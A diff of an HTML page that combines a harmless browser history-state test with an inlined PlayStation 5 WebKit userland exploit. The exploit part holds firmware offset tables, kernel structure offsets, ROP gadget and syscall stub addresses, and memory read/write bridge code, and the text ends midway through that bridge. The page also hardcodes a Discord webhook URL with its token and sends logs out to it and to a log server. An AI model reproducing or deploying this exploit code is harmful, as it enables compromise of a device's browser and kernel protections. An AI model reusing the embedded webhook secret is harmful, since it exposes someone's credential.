@@ -1,191 +1,2733 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Safe WebKit History-State Test</title>
-  <style>
-    :root { color-scheme: dark; font: 16px system-ui, sans-serif; }
-    body { max-width: 760px; margin: 2rem auto; padding: 0 1rem; background: #111827; color: #e5e7eb; }
-    h1 { font-size: 1.35rem; }
-    p { line-height: 1.5; }
-    button { padding: .65rem 1rem; font: inherit; }
-    pre { min-height: 12rem; padding: 1rem; overflow-wrap: anywhere; white-space: pre-wrap; background: #030712; border: 1px solid #374151; }
-    .note { color: #fbbf24; }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PS5 WebKit Research — Combined Safe Test + Exploit</title>
+<style>
+  :root { color-scheme: dark; font: 16px system-ui, sans-serif; }
+  body { max-width: 920px; margin: 2rem auto; padding: 0 1rem; background: #111827; color: #e5e7eb; }
+  h1 { font-size: 1.35rem; }
+  h2 { font-size: 1.1rem; margin-top: 2.5rem; padding-top: 1rem; border-top: 1px solid #374151; }
+  p { line-height: 1.5; }
+  button { padding: .65rem 1rem; font: inherit; cursor: pointer; }
+  pre { min-height: 8rem; padding: 1rem; overflow-wrap: anywhere; white-space: pre-wrap;
+        background: #030712; border: 1px solid #374151; font: 12px ui-monospace, Consolas, monospace;
+        max-height: 40vh; overflow-y: auto; }
+  .note { color: #fbbf24; }
+  #status { font-size: 1.05em; margin: .5rem 0; min-height: 1.4em; }
+  #fw-label { font-family: ui-monospace, monospace; padding: 2px 8px; background: #1f2937; border-radius: 3px; }
+  #banner { display: none; position: fixed; bottom: 0; left: 0; right: 0; padding: 14px;
+            text-align: center; font-weight: 700; letter-spacing: .1em; text-transform: uppercase; z-index: 100; }
+  #banner.ok   { display: block; background: rgba(0,200,150,.15); border-top: 2px solid #00c896; color: #00c896; }
+  #banner.fail { display: block; background: rgba(224,64,64,.15); border-top: 2px solid #e04040; color: #e04040; }
+</style>
 </head>
 <body>
-  <h1>Safe WebKit history-state test</h1>
-  <p>This page tests small, ordinary structured values with <code>history.pushState</code>, immediate <code>history.state</code> reads, and same-page Back/Forward traversal.</p>
-  <p class="note">Run it separately from any exploit page. It does not allocate large buffers, use malformed state, or perform memory access.</p>
-  <button id="run" type="button">Run safe tests</button>
-  <button id="send" type="button" disabled>Send log to Discord</button>
-  <pre id="output" aria-live="polite">Ready. No test runs automatically.</pre>
-  <script>
-    "use strict";
 
-    const output = document.getElementById("output");
-    const button = document.getElementById("run");
-    const sendButton = document.getElementById("send");
-    const webhookUrl = "https://discord.com/api/webhooks/1553463314422698085/tmWHGyzq7leGIFI1km9VbvnkVRsTexrL-JOsdPVoWoMR1AF7sfHVcx-zbf_DFbW2BEMj";
-    const logLines = [];
-    let activeTraversal = null;
+<h1>PS5 WebKit Research — Combined Safe Test + Exploit</h1>
 
-    function line(message) {
-      logLines.push(message);
-      output.textContent += message + "\n";
+<h2>Part 1 — Safe history-state test</h2>
+<p>This page tests small, ordinary structured values with <code>history.pushState</code>,
+immediate <code>history.state</code> reads, and same-page Back/Forward traversal.</p>
+<p class="note">Run this separately from the exploit below. It does not allocate large
+buffers, use malformed state, or perform memory access.</p>
+<button id="run" type="button">Run safe tests</button>
+<button id="send" type="button" disabled>Send log to Discord</button>
+<pre id="output" aria-live="polite">Ready. No test runs automatically.</pre>
+
+<h2>Part 2 — WebKit userland exploit (PSAITO / BragaTy)</h2>
+<p class="note">Runs <code>exploit.js</code> with 13.60 offsets, then hands off to the
+bridge and payload panel. Open with <code>?go=1</code> to start. Open the console
+tab; the payload panel is top-right.</p>
+<div>Firmware: <span id="fw-label">FW ??.??</span></div>
+<div id="status">Idle</div>
+<button id="run-exploit" type="button">Run exploit (reload with ?go=1)</button>
+<button id="send-exploit" type="button">Send exploit log to Discord</button>
+<button id="stop-exploit" type="button">STOP</button>
+<pre id="scr">Waiting for exploit to start...</pre>
+<div id="banner"></div>
+
+<!-- ===================================================================== -->
+<!-- SCRIPT 1 — SAFE HISTORY-STATE TEST (unchanged)                        -->
+<!-- ===================================================================== -->
+<script>
+  "use strict";
+
+  const output = document.getElementById("output");
+  const button = document.getElementById("run");
+  const sendButton = document.getElementById("send");
+  const webhookUrl = "https://discord.com/api/webhooks/1553463314422698085/tmWHGyzq7leGIFI1km9VbvnkVRsTexrL-JOsdPVoWoMR1AF7sfHVcx-zbf_DFbW2BEMj";
+  const logLines = [];
+  let activeTraversal = null;
+
+  function line(message) {
+    logLines.push(message);
+    output.textContent += message + "\n";
+  }
+
+  async function sendLog() {
+    if (!logLines.length || sendButton.disabled) return;
+    sendButton.disabled = true;
+    const form = new FormData();
+    form.append("payload_json", JSON.stringify({
+      content: "Safe WebKit history-state test log",
+      allowed_mentions: { parse: [] }
+    }));
+    const filename = "history-state-test-" + new Date().toISOString().replace(/[:.]/g, "-") + ".txt";
+    form.append("files[0]", new Blob([logLines.join("\n") + "\n"], { type: "text/plain;charset=utf-8" }), filename);
+    try {
+      await fetch(webhookUrl + "?wait=true", {
+        method: "POST",
+        body: form,
+        mode: "no-cors",
+        credentials: "omit",
+        referrerPolicy: "no-referrer"
+      });
+      line("Discord upload request submitted. Check the webhook channel; this browser cannot read Discord's cross-origin receipt.");
+    } catch (error) {
+      line("Discord upload request failed: " + String(error && error.message || error));
+    } finally {
+      sendButton.disabled = false;
     }
+  }
 
-    async function sendLog() {
-      if (!logLines.length || sendButton.disabled) return;
-      sendButton.disabled = true;
+  function stopActive(message) {
+    const job = activeTraversal;
+    if (!job) return;
+    activeTraversal = null;
+    clearTimeout(job.timeout);
+    line(message);
+    job.resolve(false);
+  }
+
+  window.addEventListener("popstate", (event) => {
+    const job = activeTraversal;
+    if (!job) return;
+    const state = event.state;
+    if (state && state.testRun === job.token && state.phase === "baseline") {
+      if (!job.forwardRequested) {
+        job.forwardRequested = true;
+        setTimeout(() => history.forward(), 0);
+      }
+      return;
+    }
+    if (state && state.testRun === job.token && state.phase === "sample") {
+      try {
+        const passed = job.verify(state.value);
+        activeTraversal = null;
+        clearTimeout(job.timeout);
+        line(`${passed ? "PASS" : "FAIL"} ${job.name}: restored value verified after Back/Forward`);
+        job.resolve(passed);
+      } catch (error) {
+        stopActive(`FAIL ${job.name}: verification threw ${String(error && error.message || error)}`);
+      }
+      return;
+    }
+    stopActive(`FAIL ${job.name}: traversal returned unexpected history state`);
+  });
+
+  function testAfterTraversal(name, value, verify) {
+    return new Promise((resolve) => {
+      const token = "safe-history-test-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);
+      const job = { token, name, verify, resolve, forwardRequested: false, timeout: 0 };
+      activeTraversal = job;
+      job.timeout = setTimeout(() => {
+        stopActive(`FAIL ${name}: no matching popstate event within 5 seconds; stopping further traversal tests`);
+      }, 5000);
+      try {
+        history.pushState({ testRun: token, phase: "baseline" }, "", location.href);
+        history.pushState({ testRun: token, phase: "sample", value }, "", location.href);
+        const immediate = history.state;
+        if (!immediate || immediate.testRun !== token || immediate.phase !== "sample" || !verify(immediate.value)) {
+          stopActive(`FAIL ${name}: immediate history.state read did not match`);
+          return;
+        }
+        line(`PASS ${name}: pushState and immediate state read`);
+        setTimeout(() => history.back(), 0);
+      } catch (error) {
+        stopActive(`FAIL ${name}: pushState threw ${String(error && error.name || "Error")}: ${String(error && error.message || error)}`);
+      }
+    });
+  }
+
+  async function runTests() {
+    button.disabled = true;
+    sendButton.disabled = true;
+    logLines.length = 0;
+    output.textContent = "";
+    line("Started: " + new Date().toISOString());
+    line("User agent: " + navigator.userAgent);
+    line("Only this test report is sent to the configured public Discord webhook.");
+    line("Each test uses a few small values and same-document history entries.");
+
+    const cases = [
+      { name: "primitive string",
+        value: "safe history-state sample",
+        verify: (v) => v === "safe history-state sample" },
+      { name: "nested plain object",
+        value: { label: "sample", count: 3, items: ["a", 7, false], child: { ok: true } },
+        verify: (v) => !!v && v.label === "sample" && v.count === 3
+          && Array.isArray(v.items) && v.items.length === 3
+          && v.items[0] === "a" && v.items[1] === 7 && v.items[2] === false
+          && !!v.child && v.child.ok === true },
+      { name: "Date",
+        value: new Date("2024-01-02T03:04:05.000Z"),
+        verify: (v) => v instanceof Date && v.toISOString() === "2024-01-02T03:04:05.000Z" },
+      { name: "small typed array",
+        value: new Uint8Array([0, 1, 127, 255]),
+        verify: (v) => v instanceof Uint8Array && v.length === 4
+          && v[0] === 0 && v[1] === 1 && v[2] === 127 && v[3] === 255 }
+    ];
+
+    let passed = 0;
+    for (const sample of cases) {
+      const ok = await testAfterTraversal(sample.name, sample.value, sample.verify);
+      if (!ok) break;
+      passed++;
+    }
+    const total = cases.length;
+    line("");
+    line(`RESULT: ${passed}/${total} traversal tests passed.`);
+    line("This checks browser history serialization/restoration only; it says nothing about exploitability or kernel access.");
+    button.disabled = false;
+    sendButton.disabled = false;
+    await sendLog();
+  }
+
+  button.addEventListener("click", runTests);
+  sendButton.addEventListener("click", sendLog);
+</script>
+
+<!-- ===================================================================== -->
+<!-- SCRIPT 2 — EXPLOIT + BRIDGE + PAYLOADS (all inlined)                  -->
+<!-- ===================================================================== -->
+<script>
+(function () {
+  "use strict";
+
+  // -------------------------------------------------------------------
+  // OFFSETS TABLE  (de-moduled from modules/offsets.mjs)
+  // -------------------------------------------------------------------
+  const OFFSETS = {
+    "09.00":{"hc":["0x34f98","0x35808","0x35900"],"gd":"0x1cb9a","nt":"0x4590","gps":"0x33c1960","gpe":"0x1ad00","cls":"0x33c1950","cle":"0x26b40","ers":"0x33c1958","ere":"0xf160"},
+    "09.20":{"hc":["0x34f98","0x35808","0x35900"],"gd":"0x1cb9a","nt":"0x4590","gps":"0x33c1960","gpe":"0x1ad00","cls":"0x33c1950","cle":"0x26b40","ers":"0x33c1958","ere":"0xf160"},
+    "09.40":{"hc":["0x34f98","0x35808","0x35900"],"gd":"0x1cb9a","nt":"0x4590","gps":"0x33c1970","gpe":"0x1ad00","cls":"0x33c1960","cle":"0x26b40","ers":"0x33c1968","ere":"0xf160"},
+    "09.60":{"hc":["0x34f98","0x35808","0x35900"],"gd":"0x1cb9a","nt":"0x4590","gps":"0x33c1970","gpe":"0x1ad00","cls":"0x33c1960","cle":"0x26b40","ers":"0x33c1968","ere":"0xf160"},
+    "10.00":{"hc":["0x2c00","0x5178","0x5690"],"gd":"0x1cdfa","nt":"0x45c0","gps":"0x35cd750","gpe":"0x1af60","cls":"0x35cd740","cle":"0x26940","ers":"0x35cd748","ere":"0xf0d0"},
+    "10.01":{"hc":["0x2c00","0x5178","0x5690"],"gd":"0x1cdfa","nt":"0x45c0","gps":"0x35cd750","gpe":"0x1af60","cls":"0x35cd740","cle":"0x26940","ers":"0x35cd748","ere":"0xf0d0"},
+    "10.20":{"hc":["0x2c00","0x5178","0x5690"],"gd":"0x1cdfa","nt":"0x45c0","gps":"0x35cd750","gpe":"0x1af60","cls":"0x35cd740","cle":"0x26940","ers":"0x35cd748","ere":"0xf0d0"},
+    "10.40":{"hc":["0x2c00","0x5178","0x5690"],"gd":"0x1cdfa","nt":"0x45c0","gps":"0x35cd750","gpe":"0x1af60","cls":"0x35cd740","cle":"0x26940","ers":"0x35cd748","ere":"0xf0d0"},
+    "10.60":{"hc":["0x2c00","0x5178","0x5690"],"gd":"0x1cdfa","nt":"0x45c0","gps":"0x35cd750","gpe":"0x1af60","cls":"0x35cd740","cle":"0x26940","ers":"0x35cd748","ere":"0xf0d0"},
+    "11.00":{"hc":["0x1e0d8","0x1e320","0x1f368"],"gd":"0x1d11a","nt":"0x4740","gps":"0x34f57b8","gpe":"0x1b280","cls":"0x34f57a8","cle":"0x26e70","ers":"0x34f57b0","ere":"0xf340"},
+    "11.20":{"hc":["0x1e0d8","0x1e320","0x1f368"],"gd":"0x1d11a","nt":"0x4740","gps":"0x34f57b8","gpe":"0x1b280","cls":"0x34f57a8","cle":"0x26e70","ers":"0x34f57b0","ere":"0xf340"},
+    "11.40":{"hc":["0x1e0d8","0x1e320","0x1f368"],"gd":"0x1d11a","nt":"0x4740","gps":"0x34f57b8","gpe":"0x1b280","cls":"0x34f57a8","cle":"0x26e70","ers":"0x34f57b0","ere":"0xf340"},
+    "11.60":{"hc":["0x1e0d8","0x1e320","0x1f368"],"gd":"0x1d11a","nt":"0x4740","gps":"0x34f57b8","gpe":"0x1b280","cls":"0x34f57a8","cle":"0x26e70","ers":"0x34f57b0","ere":"0xf340"},
+    "12.00":{"hc":["0x3a888","0x3aad0","0x3bb18"],"gd":"0x1d66a","nt":"0x48b0","gps":"0x350dc28","gpe":"0x1b7d0","cls":"0x350dc18","cle":"0x27450","ers":"0x350dc20","ere":"0xf740"},
+    "12.02":{"hc":["0x3a888","0x3aad0","0x3bb18"],"gd":"0x1d66a","nt":"0x48b0","gps":"0x350dc28","gpe":"0x1b7d0","cls":"0x350dc18","cle":"0x27450","ers":"0x350dc20","ere":"0xf740"},
+    "12.20":{"hc":["0x3a888","0x3aad0","0x3bb18"],"gd":"0x1d66a","nt":"0x48b0","gps":"0x350dc28","gpe":"0x1b7d0","cls":"0x350dc18","cle":"0x27450","ers":"0x350dc20","ere":"0xf740"},
+    "12.40":{"hc":["0x3a888","0x3aad0","0x3bb18"],"gd":"0x1d68a","nt":"0x48b0","gps":"0x350dc28","gpe":"0x1b7f0","cls":"0x350dc18","cle":"0x27470","ers":"0x350dc20","ere":"0xf740"},
+    "12.60":{"hc":["0x3a888","0x3aad0","0x3bb18"],"gd":"0x1d68a","nt":"0x48b0","gps":"0x350dc28","gpe":"0x1b7f0","cls":"0x350dc18","cle":"0x27470","ers":"0x350dc20","ere":"0xf740"},
+    "12.70":{"hc":["0x3a888","0x3aad0","0x3bb18"],"gd":"0x1d68a","nt":"0x48b0","gps":"0x350dc28","gpe":"0x1b7f0","cls":"0x350dc18","cle":"0x27470","ers":"0x350dc20","ere":"0xf740"},
+    "13.00":{"hc":["0x56a58","0x56ca0","0x57ce8"],"gd":"0x1d6fa","nt":"0x48b0","gps":"0x3352238","gpe":"0x1b860","cls":"0x3352228","cle":"0x274e0","ers":"0x3352230","ere":"0xf7d0"},
+    "13.20":{"hc":["0x56a58","0x56ca0","0x57ce8"],"gd":"0x1d6fa","nt":"0x48b0","gps":"0x3352238","gpe":"0x1b860","cls":"0x3352228","cle":"0x274e0","ers":"0x3352230","ere":"0xf7d0"},
+    "13.40":{"hc":["0x56a58","0x56ca0","0x57ce8"],"gd":"0x1d6fa","nt":"0x48b0","gps":"0x334e238","gpe":"0x1b860","cls":"0x334e228","cle":"0x274e0","ers":"0x334e230","ere":"0xf7d0"},
+    "13.60":{"hc":["0x56a58","0x56ca0","0x57ce8"],"gd":"0x1d6fa","nt":"0x48b0","gps":"0x334e238","gpe":"0x1b860","cls":"0x334e228","cle":"0x274e0","ers":"0x334e230","ere":"0xf7d0"},
+    "14.00":{"hc":["0x56a58","0x56ca0","0x57ce8"],"gd":"0x1d6fa","nt":"0x48b0","gps":"0x334e238","gpe":"0x1b860","cls":"0x334e228","cle":"0x274e0","ers":"0x334e230","ere":"0xf7d0"},
+  };
+  function fwNum(s) { const p = s.split("."); return parseInt(p[0], 10) * 100 + parseInt(p[1], 10); }
+  function detectFirmware() {
+    const m = /PlayStation 5\/(\d+)\.(\d+)/.exec(navigator.userAgent);
+    return m ? `${m[1].padStart(2,"0")}.${m[2].padStart(2,"0")}` : null;
+  }
+  function resolve(fw) {
+    if (!fw) return null;
+    if (OFFSETS[fw]) return { key: fw, entry: OFFSETS[fw], exact: true };
+    const want = fwNum(fw), maj = fw.split(".")[0];
+    let best = null, bestD = 1e9;
+    for (const k in OFFSETS) {
+      if (k.split(".")[0] !== maj) continue;
+      const d = Math.abs(fwNum(k) - want);
+      if (d < bestD) { bestD = d; best = k; }
+    }
+    return best ? { key: best, entry: OFFSETS[best], exact: false } : null;
+  }
+  function profilesFor(fw) {
+    const base = resolve(fw);
+    if (!base) return [];
+    const keyOf = (e) => [e.gps,e.cls,e.ers,e.gpe,e.cle,e.ere,e.gd,e.nt,e.hc.join(",")].join("|");
+    const seen = new Set([keyOf(base.entry)]);
+    const out = [base.entry];
+    const want = fwNum(fw), maj = fw.split(".")[0];
+    const fam = Object.keys(OFFSETS)
+      .filter((k) => k.split(".")[0] === maj && k !== base.key)
+      .sort((a, b) => Math.abs(fwNum(a) - want) - Math.abs(fwNum(b) - want));
+    for (const k of fam) {
+      const e = OFFSETS[k], key = keyOf(e);
+      if (!seen.has(key)) { seen.add(key); out.push(e); }
+    }
+    return out;
+  }
+  window.__PSAITO_OFFSETS = { OFFSETS, detectFirmware, resolve, profilesFor };
+
+  // -------------------------------------------------------------------
+  // KERNEL-DATA  (verbatim from modules/kernel-data.js)
+  // -------------------------------------------------------------------
+  (function () {
+    const profiles = Object.freeze({
+      "13.40": Object.freeze({
+        firmware: "13.40", dataFromText: 0x00CB0000,
+        allprocFromData: 0x28C9E80, securityFlagsFromData: 0x0D99064,
+        rootvnodeFromData: 0x3137510, busDataDevicesFromData: 0x20981E8,
+        allprocFromText: 0x03579E80, securityFlagsFromText: 0x01A49064,
+        rootvnodeFromText: 0x03DE7510, busDataDevicesFromText: 0x02D481E8
+      }),
+      "13.60": Object.freeze({
+        firmware: "13.60", dataFromText: 0x00CC0000,
+        allprocFromData: 0x28C9E80, securityFlagsFromData: 0x0D9C064,
+        rootvnodeFromData: 0x314B510, busDataDevicesFromData: 0x2098228,
+        allprocFromText: 0x03589E80, securityFlagsFromText: 0x01A5C064,
+        rootvnodeFromText: 0x03E0B510, busDataDevicesFromText: 0x02D58228
+      }),
+    });
+    const supplied = Object.freeze({
+      dataFromText: 0x00CB0000, allprocFromText: 0x03589E80,
+      securityFlagsFromText: 0x01A49064, rootvnodeFromText: 0x03DE7510,
+      busDataDevicesFromText: 0x02D481E8
+    });
+    function normalizeFirmware(v) {
+      const fw = String(v ?? "").trim();
+      return fw === "13.6" ? "13.60" : fw;
+    }
+    function forFirmware(v) { return profiles[normalizeFirmware(v)] || null; }
+    function compareSupplied(v) {
+      const p = forFirmware(v);
+      if (!p) return null;
+      return Object.keys(supplied).filter(k => p[k] !== supplied[k]);
+    }
+    Object.defineProperty(globalThis, "PS5_KERNEL_OFFSET_REFERENCE", {
+      value: Object.freeze({
+        source: "ps5-payload-dev/sdk crt/kernel.c tag v0.42",
+        scope: "read-only metadata; offsets are not proof of kernel access",
+        profiles, supplied, forFirmware, compareSupplied
+      }),
+      configurable: false, enumerable: false, writable: false
+    });
+  })();
+
+  // -------------------------------------------------------------------
+  // X1NON 13X TABLE  (compressed; all four 13.x firmware entries share
+  //                   the same wkGadgets and syscallStubs — verified)
+  // -------------------------------------------------------------------
+  (function () {
+    const WK = {
+      "ret":0xc7, "pop rdi":0x288b2, "pop rsi":0x1ee7a, "pop rdx":0xfa7a2,
+      "pop rcx":0x80597, "pop rax":0x3c98e, "pop rsp":0xa1138,
+      "pop r8":0x8ce7c, "pop r9":0x80596, "mov [rdi], rsi":0xc05b6,
+      "mov [rdi], rax":0x3881f, "mov [rdi], eax":0x38820,
+      "mov rax, [rax]":0x6fd92, "add rax, rcx":0x319fe4,
+      "cmp [rcx], eax":0x1c4ec65, "inc dword [rax]":0x295b95,
+      "seta al":0x388a2, "setb al":0x1f006, "sete al":0x40e7,
+      "setg al":0x1036946, "setl al":0x31df00,
+      "shl rax, 3":0x1c5b743, "shl rax, 4":0xd16072,
+      "shr rax, 3":0xd08fe1, "shr rax, 4":0x1adc233,
+      "infloop":0x1553d
+    };
+    const SY = {
+      1:0x1bb1a, 2:0x1d520, 3:0x1b6e0, 4:0x1b640, 5:0x1bce0, 6:0x1c310,
+      7:0x1aee0, 10:0x1d060, 12:0x1c9d0, 15:0x1c390, 20:0x1b860,
+      23:0x1b340, 24:0x1c9b0, 25:0x1bd20, 27:0x1bdc0, 28:0x1bff0,
+      29:0x1cb80, 30:0x1b240, 31:0x1b060, 32:0x1d200, 33:0x1cd20,
+      34:0x1cea0, 35:0x1c850, 36:0x1d750, 37:0x1bcc0, 39:0x1b760,
+      41:0x1cd80, 42:0x1b6b0, 43:0x1d3c0, 44:0x1d710, 47:0x1b1e0,
+      49:0x1b1c0, 50:0x1cab0, 53:0x1b400, 54:0x1b580, 55:0x1c890,
+      56:0x1c790, 59:0x1bfad, 65:0x1c3f0, 73:0x1bbe0, 74:0x1c990,
+      75:0x1bad0, 78:0x1bca0, 79:0x1b140, 80:0x1b700, 83:0x1b120,
+      86:0x1af40, 89:0x1c7f0, 90:0x1cc00, 92:0x1c1f0, 93:0x1bd40,
+      95:0x1b180, 96:0x1c0d0, 97:0x1b920, 98:0x1c9f0, 99:0x1d380,
+      100:0x1af00, 101:0x1cfa0, 102:0x1d320, 104:0x1d020, 105:0x1c230,
+      106:0x1b520, 113:0x1c550, 114:0x1bf00, 116:0x1d730, 117:0x1d810,
+      118:0x1aec0, 120:0x1c170, 121:0x1bfd0, 122:0x1cc60, 124:0x1bb60,
+      125:0x1c3d0, 126:0x1d300, 127:0x1bec0, 128:0x1ce80, 131:0x1be40,
+      133:0x1d770, 134:0x1d5a0, 135:0x1c910, 136:0x1c690, 137:0x1b8c0,
+      138:0x1adb0, 140:0x1d2c0, 141:0x1c3b0, 147:0x1c630, 165:0x1b0e0,
+      182:0x1d100, 183:0x1af20, 188:0x1d160, 189:0x1d560, 190:0x1bee0,
+      191:0x1b5e0, 192:0x1c8d0, 194:0x1be20, 195:0x1ba00, 196:0x1d080,
+      202:0x1ce60, 203:0x1c4b0, 204:0x1cf00, 206:0x1b960, 209:0x1bf40,
+      232:0x1afe0, 233:0x1c470, 234:0x1d4d0, 235:0x1d0a0, 236:0x1b7c0,
+      237:0x1d580, 238:0x1ca10, 239:0x1bb80, 240:0x1cf60, 241:0x1c770,
+      242:0x1b720, 243:0x1c5d0, 247:0x1d000, 251:0x1baf9, 253:0x1cba0,
+      272:0x1d360, 289:0x1ca50, 290:0x1bf60, 310:0x1bc60, 315:0x1d180,
+      324:0x1b7e0, 325:0x1cc20, 327:0x1b8e0, 328:0x1c570, 329:0x1b080,
+      330:0x1bf20, 331:0x1bd80, 332:0x1b300, 333:0x1b420, 334:0x1b670,
+      340:0x1ae10, 341:0x1ae50, 343:0x1cda0, 345:0x1cec0, 346:0x1cae0,
+      362:0x1d0e0, 363:0x1b2c0, 379:0x1b260, 392:0x1b380, 393:0x1d850,
+      397:0x1b840, 400:0x1b3e0, 401:0x1c190, 402:0x1ca70, 403:0x1d830,
+      404:0x1b540, 405:0x1cfc0, 406:0x1cc80, 407:0x1b3a0, 408:0x1cc40,
+      416:0x1d140, 417:0x1cde0, 421:0x1ba64, 422:0x1c7d0, 423:0x1c8f0,
+      429:0x1bab0, 430:0x1b160, 431:0x1b4e0, 432:0x1be80, 433:0x1b500,
+      441:0x1cb60, 442:0x1ae30, 443:0x1b780, 444:0x1c830, 454:0x1aeb0,
+      455:0x1d280, 456:0x1d1e0, 464:0x1cb20, 466:0x1c090, 475:0x1b820,
+      476:0x1c970, 477:0x1d260, 478:0x1cd60, 479:0x1bda0, 480:0x1b800,
+      481:0x1add0, 482:0x1d7d0, 483:0x1d240, 486:0x1ba20, 487:0x1d640,
+      488:0x1ce00, 499:0x1b1a0, 515:0x1c8b0, 522:0x1c2b0, 532:0x1c370,
+      533:0x1c0f0, 534:0x1c6f0, 535:0x1b5c0, 536:0x1c410, 538:0x1c350,
+      539:0x1b7a0, 540:0x1c710, 541:0x1c2d0, 542:0x1c5b0, 543:0x1cdc0,
+      544:0x1c730, 545:0x1cce0, 546:0x1ba90, 547:0x1c590, 548:0x1be60,
+      549:0x1c070, 550:0x1b020, 551:0x1afa0, 552:0x1d620, 553:0x1c670,
+      554:0x1cca0, 555:0x1c930, 556:0x1c1d0, 557:0x1bf80, 558:0x1bc80,
+      559:0x1d8b0, 560:0x1b740, 563:0x1c0b0, 564:0x1b100, 565:0x1c130,
+      566:0x1c150, 567:0x1cbe0, 572:0x1b9c0, 585:0x1d040, 586:0x1bba0,
+      587:0x1c450, 588:0x1af80, 591:0x1b5a0, 592:0x1b8a0, 593:0x1d3a0,
+      594:0x1c250, 595:0x1b220, 596:0x1d120, 597:0x1c4f0, 598:0x1c050,
+      599:0x1d400, 600:0x1adf0, 601:0x1b980, 602:0x1c010, 603:0x1cee0,
+      604:0x1b460, 605:0x1bbc0, 606:0x1b360, 607:0x1c510, 608:0x1d7f0,
+      610:0x1d890, 611:0x1b690, 612:0x1d600, 613:0x1ad90, 615:0x1c110,
+      616:0x1d220, 617:0x1c810, 618:0x1c4d0, 619:0x1b2a0, 620:0x1b3c0,
+      622:0x1afc0, 623:0x1c430, 624:0x1d870, 625:0x1ce20, 626:0x1b900,
+      627:0x1af60, 628:0x1c610, 629:0x1b9a0, 630:0x1c1b0, 632:0x1d7b0,
+      633:0x1bc40, 634:0x1bc00, 635:0x1bd00, 636:0x1b940, 637:0x1c6b0,
+      638:0x1ba40, 639:0x1d8d0, 640:0x1ca30, 641:0x1b560, 642:0x1bde0,
+      643:0x1cbc0, 646:0x1d500, 647:0x1c6d0, 648:0x1b000, 649:0x1d2a0,
+      652:0x1b0a0, 653:0x1b880, 654:0x1b620, 655:0x1d0c0, 656:0x1cd00,
+      657:0x1bd60, 658:0x1b4c0, 659:0x1b9e0, 660:0x1d790, 661:0x1cf40,
+      662:0x1b440, 663:0x1c290, 664:0x1b320, 665:0x1ce40, 666:0x1c270,
+      667:0x1b200, 668:0x1c950, 669:0x1d3e0, 670:0x1d2e0, 671:0x1cd40,
+      672:0x1d1a0, 673:0x1d340, 674:0x1d1c0, 675:0x1c210, 676:0x1cb00,
+      677:0x1c5f0, 678:0x1c030, 679:0x1b600, 680:0x1c330, 681:0x1cb40,
+      682:0x1b280, 683:0x1d660, 684:0x1be00, 685:0x1b040, 686:0x1ae90,
+      687:0x1b4a0, 688:0x1bea0, 689:0x1d5e0, 690:0x1c870, 691:0x1c7b0,
+      692:0x1cf80, 693:0x1c490, 694:0x1c2f0, 705:0x1b2e0, 713:0x1d5c0,
+      716:0x1bb40, 717:0x1c650, 718:0x1bc20, 719:0x1ae70, 720:0x1cf20,
+      721:0x1cfe0, 722:0x1b0c0, 725:0x1c750, 732:0x1ccc0, 733:0x1b480
+    };
+    const SYSTR = {};
+    for (const k of Object.keys(SY)) SYSTR[String(k)] = SY[k];
+    const entry = { wkGadgets: WK, syscallStubs: SYSTR };
+    window.X1NON_13X = {
+      "13.00": entry, "13.20": entry, "13.40": entry, "13.60": entry
+    };
+  })();
+
+  // -------------------------------------------------------------------
+  // BRIDGE  (verbatim from modules/bridge.js, IIFE preserved)
+  // -------------------------------------------------------------------
+  (function (global) {
+    const PS5 = {
+      ready: false, mode: "NONE", fw: "??.??",
+      webkitBase: null, libkernelBase: null,
+      gadgets: null, stubs: null, stubMode: false,
+      mallocEnd: 0, notes: [],
+    };
+    global.PS5 = PS5;
+    let ctx = null;
+    let heapPtr = 0, heapEnd = 0, chainBase = 0;
+    let lastErr = 0;
+    const CH = 0x100;
+    const N = (a) => typeof a === "bigint" ? Number(a) : a;
+    const B = (a) => typeof a === "bigint" ? a : BigInt(a || 0);
+    const HEX = (x) => "0x" + B(x).toString(16);
+    const ELM = {1:"EPERM",2:"ENOENT",9:"EBADF",12:"ENOMEM",13:"EACCES",
+      14:"EFAULT",16:"EBUSY",17:"EEXIST",22:"EINVAL",28:"ENOSPC",35:"EAGAIN",
+      38:"ENOTEMPTY",45:"EOPNOTSUPP",55:"ENOEXEC",63:"ENAMETOOLONG",78:"ENOSYS",
+      89:"ENOTSUP",93:"ENOTCAPABLE",94:"ECAPMODE"};
+    let LOG_SERVER = (function () {
+      try {
+        const qp = new URLSearchParams(location.search).get("logserver");
+        if (qp) return qp;
+        if (typeof window !== "undefined" && window.LOG_SERVER) return window.LOG_SERVER;
+        return "http://" + location.hostname + ":8080/log";
+      } catch (e) { return ""; }
+    })();
+    let logRemoteOK = false;
+    function httpLog(line) {
+      if (!LOG_SERVER) return;
+      try {
+        const x = new XMLHttpRequest();
+        x.open("POST", LOG_SERVER, true);
+        x.setRequestHeader("Content-Type", "text/plain");
+        x.send(String(line));
+        logRemoteOK = true;
+      } catch (e) {}
+    }
+    async function log(msg) {
+      const s = String(msg);
+      console.log(s);
+      httpLog(s);
+      try { if (typeof global.__psaitoAppend === "function") global.__psaitoAppend(s); } catch (e) {}
+      const appendSticky = (id, cap) => {
+        try {
+          const d = document.getElementById(id);
+          if (!d) return;
+          const atBottom = d.scrollHeight - d.scrollTop - d.clientHeight < 24;
+          d.textContent = (d.textContent + "\n" + s).split("\n").slice(-cap).join("\n");
+          if (atBottom) d.scrollTop = d.scrollHeight;
+        } catch (e) {}
+      };
+      appendSticky("scr", 2000);
+      appendSticky("plg", 2000);
+    }
+    global.log = log;
+    global.toHex = (x) => HEX(x);
+    function chunkN(addr, off, left) {
+      const toPage = CH - ((addr + off) % CH);
+      return Math.min(toPage, left);
+    }
+    function rdBytes(addr, len) {
+      addr = N(addr);
+      const out = new Uint8Array(len);
+      let off = 0;
+      while (off < len) {
+        const n = chunkN(addr, off, len - off);
+        const v = ctx.aim(addr + off);
+        for (let i = 0; i < n; ++i) out[off + i] = v[i];
+        off += n;
+      }
+      return out;
+    }
+    function wrBytes(addr, data) {
+      addr = N(addr);
+      let off = 0;
+      while (off < data.length) {
+        const n = chunkN(addr, off, data.length - off);
+        const v = ctx.aim(addr + off);
+        for (let i = 0; i < n; ++i) v[i] = data[off + i];
+        off += n;
+      }
+    }
+    function pack(v, w) {
+      v = BigInt.asUintN(64, B(v));
+      const o = new Uint8Array(w);
+      for (let i = 0; i < w; ++i)
+        o[i] = Number((v >> BigInt(8 * i)) & 0xffn);
